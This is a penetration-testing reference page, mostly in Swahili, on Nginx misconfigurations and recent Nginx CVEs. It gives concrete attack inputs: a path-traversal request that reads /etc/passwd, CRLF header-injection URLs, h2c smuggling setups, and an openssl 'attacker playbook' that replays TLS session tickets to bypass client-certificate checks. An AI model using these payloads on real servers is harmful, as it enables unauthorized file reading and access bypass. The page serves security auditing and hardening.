# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Missing root location <a href="#missing-root-location" id="missing-root-location"></a>

Unaposanidi server ya Nginx, the **root directive** ina jukumu muhimu kwa kufafanua directory ya msingi ambayo ndiko faili zinapotoka zinapohudumiwa. Angalia mfano hapa chini:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
Katika configuration hii, `/etc/nginx` imewekwa kama root directory. Mpangilio huu unaruhusu upatikanaji wa faili ndani ya root iliyobainishwa, kama `/hello.txt`. Hata hivyo, ni muhimu kutambua kuwa imefafanuliwa tu location maalum (`/hello.txt`). Hakuna configuration kwa root location (`location / {...}`). Kutokuwepo kwa hivyo kunamaanisha kuwa root directive inatumika globally, ikiwezesha requests kwa root path `/` kufikia faili chini ya `/etc/nginx`.

Suala muhimu la usalama linatokana na configuration hii. Ombi rahisi la `GET`, kama `GET /nginx.conf`, linaweza kufichua taarifa nyeti kwa kuwasilisha Nginx configuration file iliyo kwenye `/etc/nginx/nginx.conf`. Kuweka root kwenye directory isiyo nyeti zaidi, kama `/etc`, kunaweza kupunguza hatari hii, lakini bado kunaweza kuruhusu upatikanaji usiotarajiwa wa faili nyingine muhimu, ikiwa ni pamoja na other configuration files, access logs, hata encrypted credentials zinazotumika kwa HTTP basic authentication.

## Alias LFI Misconfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Katika configuration files za Nginx, inafaa kuchunguza kwa makini directives za "location". Udhaifu unaojulikana kama Local File Inclusion (LFI) unaweza kuanzishwa bila kukusudia kupitia configuration inayofanana na ifuatayo:
```
location /imgs {
alias /path/images/;
}
```
Usanidi huu unaathirika na mashambulizi ya LFI kwa sababu seva inatafsiri maombi kama `/imgs../flag.txt` kama jaribio la kufikia faili nje ya saraka iliyokusudiwa, ambayo kwa vitendo inatafsiriwa kuwa `/path/images/../flag.txt`. Hitilafu hii inamruhusu mshambuliaji kupata faili kutoka kwenye mfumo wa faili wa seva ambazo hazipaswi kupatikana kupitia wavuti.

Ili kupunguza udhaifu huu, usanidi unapaswa kurekebishwa kama ifuatavyo:
```
location /imgs/ {
alias /path/images/;
}
```
Taarifa zaidi: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Majaribio ya Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Kizuizi usio salama wa path <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Angalia ukurasa ufuatao ili kujifunza jinsi ya bypass directives kama:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Matumizi yasiyo salama ya variable / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Variables zilizo dhaifu `$uri` na `$document_ur`i; hili linaweza kurekebishwa kwa kuzibadilisha na `$request_uri`.
>
> Regex pia inaweza kuwa dhaifu kama:
>
> `location ~ /docs/([^/])? { … $1 … }` - Dhaifu
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Si dhaifu (kukagua nafasi)
>
> `location ~ /docs/(.*)? { … $1 … }` - Si dhaifu

Udhaifu katika usanidi wa Nginx unaonyeshwa kwa mfano hapa chini:
```
location / {
return 302 https://example.com$uri;
}
```
Alama \r (Carriage Return) na \n (Line Feed) zinaashiria mstari mpya katika HTTP requests, na fomu zao zilizowekwa kwenye URL zinawakilishwa kama `%0d%0a`. Kuingiza alama hizi kwenye request (mfano, `http://localhost/%0d%0aDetectify:%20clrf`) kwa server iliyopangwa vibaya husababisha server kutoa header mpya yenye jina `Detectify`. Hii inatokea kwa sababu variable $uri inafanya decode ya alama za mstari mpya zilizowekwa kwenye URL, na kusababisha header isiyotegemewa katika response:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Jifunze zaidi kuhusu hatari za CRLF injection na response splitting hapa: [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Pia mbinu hii imeelezewa katika [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) na mifano yenye udhaifu pamoja na mekanismu za ugundaji. Kwa mfano, ili kugundua usanidi usio sahihi huu kutoka mtazamo wa blackbox unaweza kutuma maombi haya:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Ikiwa ina udhaifu, ya kwanza itarudisha kwani "X" ni method yoyote ya HTTP na ya pili itarudisha kosa kwa sababu H si method halali. Kwa hivyo server itapokea kitu kama: `GET / H HTTP/1.1` na hili litasababisha kosa.

Mifano mingine ya ugundaji itakuwa:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Baadhi ya usanidi wenye udhaifu uliopatikana ulioonyeshwa kwenye hotuba hiyo walikuwa:

- Angalia jinsi **`$uri`** imewekwa kama ilivyo katika URL ya mwisho
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Angalia tena jinsi **`$uri`** ilivyo kwenye URL (wakati huu ndani ya parameter)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Sasa kwenye AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Kigezo chochote

Iligundulika kuwa **user-supplied data** inaweza kutendewa kama **Nginx variable** katika mazingira fulani. Sababu ya tabia hii bado haieleweki kabisa, lakini si jambo la nadra na si rahisi kuithibitisha. Anomali hii ilibainishwa katika ripoti ya usalama kwenye HackerOne, ambayo inaweza kuonekana [here](https://hackerone.com/reports/370094). Uchunguzi zaidi wa ujumbe wa kosa ulisababisha kubainika kuwa hutokea ndani ya [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), ukibainisha Server Side Includes (SSI) kama chanzo cha tatizo.

Ili **kutambua usanidi huu mbaya**, amri ifuatayo inaweza kutumika, inayohusisha kuweka referer header ili kujaribu uchapishaji wa variable:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Uchunguzi wa usanidi mbaya huu katika mifumo ulifichua matukio kadhaa ambapo variables za Nginx zingeweza kuchapishwa na mtumiaji. Hata hivyo, kupungua kwa idadi ya matukio yaliyo hatarini kunaonyesha kwamba juhudi za kukarabati tatizo hili zimefanikiwa kwa kiasi.

### Kutumia try_files na $URI$ARGS variables

Usanidi usio sahihi wa Nginx ufuatao unaweza kusababisha LFI vulnerability:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
Katika usanidi wetu tuna directive `try_files` ambayo inatumika kukagua uwepo wa faili kwa mpangilio uliobainishwa. Nginx itahudumia ile ya kwanza itakayopatikana. Muundo wa msingi wa directive `try_files` ni kama ifuatavyo:
```
try_files file1 file2 ... fileN fallback;
```
Nginx itaangalia uwepo wa kila faili kwa mpangilio uliotajwa. Ikiwa faili ipo, itatumikwa mara moja. Ikiwa hakuna faili kati ya zilizotajwa, ombi litapitishwa kwa chaguo la fallback, ambalo linaweza kuwa URI nyingine au ukurasa maalum wa kosa.

Hata hivyo, wakati ukitumia `$uri$args` variables katika directive hii, Nginx itajaribu kutafuta faili inayolingana na request URI iliyochanganywa na yoyote ya query string arguments. Kwa hivyo tunaweza exploit configuration hii:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Kwa payload ifuatayo:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Tukitumia payload yetu tutatoroka kutoka kwenye root directory (iliyoainishwa katika Nginx configuration) na kupakia faili ya `/etc/passwd`. Katika debug logs tunaweza kuona jinsi Nginx inavyojaribu mafaili:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC dhidi ya Nginx ukitumia mpangilio uliotajwa hapo juu:
![Mfano wa ombi la burp](../../images/nginx_try_files.png)

## Kusoma majibu ghafi ya backend

Nginx inatoa kipengele kupitia `proxy_pass` kinachoruhusu kukamata makosa na HTTP headers yanayozalishwa na backend, kwa lengo la kuficha ujumbe wa makosa ya ndani na headers. Hii inafikiwa kwa Nginx kutumikia kurasa maalumu za makosa kama majibu kwa makosa ya backend. Hata hivyo, changamoto zinatokea Nginx inapokutana na ombi la HTTP lisilo halali. Ombi kama hilo hutumwa kwa backend kama lilivyoripotiwa, na majibu ghafi ya backend kisha hutumwa moja kwa moja kwa mteja bila uingiliaji wa Nginx.

Angalia mfano wa hali inayohusisha programu ya uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Ili kudhibiti hili, maelekezo maalum katika usanidi wa Nginx zinatumiwa:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Amri hii inaruhusu Nginx kutoa response maalum kwa responses za backend zenye status code kubwa kuliko 300. Inahakikisha kwamba, kwa mfano wetu wa uWSGI application, response ya `500 Error` inakamatwa na kushughulikiwa na Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Kama jina linavyosema, amri hii inaficha HTTP headers maalum kutoka kwa client, ikiboresha faragha na usalama.

Wakati ombi halali la `GET` linapotumwa, Nginx linalishughulikia kwa kawaida, likirejesha response ya kosa ya kawaida bila kufichua vichwa vya siri. Hata hivyo, ombi batili la HTTP linapopita juu ya mfumo huu, husababisha kufichuka kwa raw backend responses, ikiwa ni pamoja na vichwa vya siri na ujumbe wa makosa.

## merge_slashes imewekwa kuwa off

Kwa chaguo-msingi, **`merge_slashes` directive** ya Nginx imewekwa kuwa **`on`**, ambayo inabana slashes nyingi kwenye URL kuwa slash moja. Kipengele hiki, wakati kinarahisisha usindikaji wa URL, kinaweza bila kukusudia kuficha udhaifu katika applications nyuma ya Nginx, hasa zile zinazoweza kuathiriwa na local file inclusion (LFI) attacks. Wataalamu wa usalama **Danny Robinson and Rotem Bar** wameonyesha hatari zinazoweza kutokea kwa tabia hii ya chaguo-msingi, hasa Nginx inapofanya kama reverse-proxy.

Ili kupunguza hatari hizi, inashauriwa **kuwasha `merge_slashes` directive kuwa off** kwa applications zilizo hatarini kwa udhaifu huu. Hii inahakikisha kwamba Nginx inapitisha requests kwa application bila kubadilisha muundo wa URL, hivyo kutoficha matatizo ya usalama yaliyopo.

Kwa taarifa zaidi angalia [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Vichwa vya Jibu**

Kama ilivyoonyeshwa katika [**this writeup**](https://mizu.re/post/cors-playground), kuna vichwa fulani ambavyo ikiwa vipo katika response kutoka kwa web server vitabadilisha tabia ya proxy ya Nginx. Unaweza kuvitazama [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Inaashiria Nginx kufanya redirect ya ndani (internal redirect) ya ombi kwenda eneo lililoainishwa.
- `X-Accel-Buffering`: Inasimamia kama Nginx inapaswa ku-buffer response au la.
- `X-Accel-Charset`: Inaweka character set ya response wakati wa kutumia X-Accel-Redirect.
- `X-Accel-Expires`: Inaweka muda wa kumalizika (expiration) wa response wakati wa kutumia X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Inapunguza kiwango cha uhamisho kwa responses wakati wa kutumia X-Accel-Redirect.

Kwa mfano, header **`X-Accel-Redirect`** itasababisha **redirect** ya ndani ndani ya nginx. Hivyo kuwa na configuration ya nginx ikiwa na kitu kama **`root /`** na response kutoka kwa web server yenye **`X-Accel-Redirect: .env`** kutasababisha nginx itume maudhui ya **`/.env`** (Path Traversal).

### **Default Value in Map Directive**

Katika **Nginx configuration**, `map` directive mara nyingi ina jukumu katika **udhibiti wa ruhusa**. Makosa ya kawaida ni kutofafanua thamani ya **default**, ambayo inaweza kusababisha upatikanaji bila ruhusa. Kwa mfano:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Bila `default`, **mtumiaji mwenye nia mbaya** anaweza kuvuka udhibiti wa usalama kwa kufikia **URI isiyoelezwa** ndani ya `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) inashauri kuweka **default value** ili kuepuka matatizo kama haya.

### **DNS Spoofing Vulnerability**

DNS spoofing dhidi ya Nginx inaweza kufanyika chini ya masharti fulani. Ikiwa mshambuliaji anajua **DNS server** inayotumika na Nginx na anaweza kuingilia kati maswali yake ya DNS, wanaweza kuiga rekodi za DNS. Hata hivyo, njia hii haifanyi kazi ikiwa Nginx imewekwa kutumia **localhost (127.0.0.1)** kwa kutatua DNS. Nginx inaruhusu kubainisha DNS server kama ifuatavyo:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` na `internal` Maagizo

The **`proxy_pass`** directive is utilized for redirecting requests to other servers, either internally or externally. The **`internal`** directive ensures that certain locations are only accessible within Nginx. While these directives are not vulnerabilities by themselves, their configuration requires careful examination to prevent security lapses.

## proxy_set_header Upgrade & Connection

Ikiwa server ya nginx imewekwa kupitisha headers za Upgrade na Connection, [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) inaweza kufanywa ili kufikia endpoints zilizolindwa/za ndani.

> [!CAUTION]
> Udhaifu huu ungemruhusu mshambuliaji kuanzisha **muunganisho wa moja kwa moja na `proxy_pass` endpoint** (`http://backend:9999` in this case) ambapo yaliyomo hayatakaguliwa na nginx.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Kumbuka kwamba hata kama `proxy_pass` ilikuwa ikielekeza kwa **njia** maalum kama `http://backend:9999/socket.io` muunganisho utaanzishwa na `http://backend:9999` hivyo unaweza **kuwasiliana na njia yoyote nyingine ndani ya endpoint hiyo ya ndani. Hivyo haijalishi ikiwa njia imebainishwa katika URL ya proxy_pass.**

## Moduli ya HTTP/3 QUIC remote DoS & leak (2024)

Mnamo 2024 Nginx ilitangaza CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 na CVE-2024-35200 zikionyesha kwamba **kikao kimoja cha adui cha QUIC** kinaweza kusababisha worker processes kuzama au leak kumbukumbu kila wakati `ngx_http_v3_module` ya majaribio imejengwa na socket `listen ... quic` iko wazi. Matoleo yaliyoathirika ni 1.25.0–1.25.5 na 1.26.0, wakati 1.27.0/1.26.1 zinabeba marekebisho; ugundaji wa kumbukumbu (CVE-2024-34161) pia unahitaji MTUs kubwa kuliko 4096 bytes ili kuonyesha data nyeti (maelezo katika advisory ya nginx ya 2024 iliyotajwa hapa chini).

**Recon & exploitation hints**

- HTTP/3 ni opt-in, kwa hivyo scan kwa majibu ya `Alt-Svc: h3=":443"` au brute-force UDP/443 QUIC handshakes; mara ikithibitishwa, fuzz the handshake na STREAM frames kwa custom `quiche-client`/`nghttp3` payloads ili ku-trigger worker crashes na kulazimisha log leakage.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Kupitisha upya kikao cha TLS ili kuepuka uthibitisho wa cheti la mteja (CVE-2025-23419)

Taarifa ya Februari 2025 ilifichua kwamba nginx 1.11.4–1.27.3 iliyojengwa na OpenSSL inaruhusu **reusing a TLS 1.3 session** kutoka kwenye name-based virtual host mmoja ndani ya mwingine, hivyo client aliyekubaliana na host isiyohitaji cheti anaweza kureplay ticket/PSK ili kuingia kwenye vhost iliyo na ulinzi wa `ssl_verify_client on;` na kupitisha mTLS kabisa. Hitilafu inatokea kila wakati virtual hosts nyingi zinaposhiriki cache na tickets za TLS 1.3 (tazama nginx advisory ya 2025 iliyotajwa hapa chini).

**Playbook ya mshambuliaji**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Ikiwa lengo lina udhaifu, handshake ya pili inakamilika bila kuwasilisha cheti la mteja, na hivyo kufichua maeneo yaliyolindwa.

**Nini cha kuchunguza**

- Bloki mchanganyiko za `server_name` zinazoshiriki `ssl_session_cache shared:SSL` na `ssl_session_tickets on;`.
- Bloki za Admin/API zinazotarajia mTLS lakini zinarithi mipangilio ya shared session cache/ticket kutoka kwa hosts za umma.
- Automation inayowasha TLS 1.3 session resumption kwa ujumla (mf., Ansible roles) bila kuzingatia vhost isolation.

## HTTP/2 Rapid Reset ustahimilivu (tabia ya CVE-2023-44487)

Shambulio la HTTP/2 Rapid Reset (CVE-2023-44487) bado linaathiri nginx wakati waendeshaji wanapoongeza `keepalive_requests` au `http2_max_concurrent_streams` zaidi ya thamani za default: mshambuliaji hufungua muunganisho mmoja wa HTTP/2, kuifurika na maelfu ya streams, kisha mara moja hutuma fremu za `RST_STREAM` ili dari la concurrency lisifikie kamwe, wakati CPU inaendelea kuchoma kwenye mantiki ya tear-down. Thamani za chaguo-msingi za nginx (128 concurrent streams, 1000 keepalive requests) huzuia madhara kuwa madogo; kupandisha mipaka hiyo "kwa kiasi kikubwa" kunafanya iwe rahisi kuwatesa wafanyakazi wa server hata kutoka kwa mteja mmoja (tazama F5 write-up iliyotajwa hapa chini).

**Vidokezo vya utambuzi**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hosts zinazofichua thamani kubwa isiyo ya kawaida kwa maelekezo hayo ni malengo mazuri: mteja mmoja wa HTTP/2 anaweza kurudia kuunda stream na kutuma fremu za mara moja `RST_STREAM` ili kuweka CPU ikifanya kazi bila kuvunja kikomo cha concurrency.

## Jaribu mwenyewe

Detectify imeunda repositori ya GitHub ambapo unaweza kutumia Docker kuanzisha server yako ya majaribio ya Nginx iliyo hatarishi yenye baadhi ya mipangilio isiyo sahihi zilizojadiliwa katika makala hii na ujaribu kuzipata mwenyewe!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Zana za uchambuzi wa statiki

### [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)

GixyNG (fork iliyosasishwa ya GIXY) ni zana ya kuchambua mipangilio ya Nginx, kwa lengo la kutambua udhaifu, maelekezo yasiyo salama, na mipangilio hatarishi. Pia hupata mipangilio isiyo sahihi inayoathiri utendaji, na inagundua nafasi za kuimarisha zilizokosewa, ikiruhusu utambuzi la kasoro kiotomatiki.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner ni zana rahisi kutafuta mipangilio isiyo sahihi ya kawaida ya Nginx na udhaifu.

## Marejeleo

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
